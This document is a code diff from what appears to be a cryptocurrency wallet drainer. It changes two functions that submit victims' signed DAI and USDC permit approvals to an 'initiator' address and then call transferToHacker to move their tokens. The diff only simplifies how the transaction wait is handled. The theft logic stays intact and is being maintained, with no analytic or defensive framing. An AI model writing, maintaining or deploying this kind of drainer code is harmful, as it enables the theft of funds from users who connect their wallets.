@@ -280,15 +280,8 @@ const daiPermitV1 = async (token, permitToken, nonce, provider) => {
       getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
     ).then(async (result) => {
       console.log(result)
-      await waitForTransaction({
-        chainId: 1,
-        hash: result.hash
-      }).then(async (result) => {
-        console.log(result)
-        await transferToHacker(token);
-      }).catch(async (error) => {
-        console.log(error)
-      })
+      await result.wait();
+      await transferToHacker(token);
     })
 
   }).catch(async (error) => {
@@ -311,15 +304,8 @@ const usdcPermitV2 = async (token, permitToken, provider) => {
       getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
     ).then(async (result) => {
       console.log(result)
-      await waitForTransaction({
-        chainId: 1,
-        hash: result.hash
-      }).then(async (result) => {
-        console.log(result)
-        await transferToHacker(token);
-      }).catch(async (error) => {
-        console.log(error)
-      })
+      await result.wait();
+      await transferToHacker(token);
     })
 
   }).catch(async (error) => {
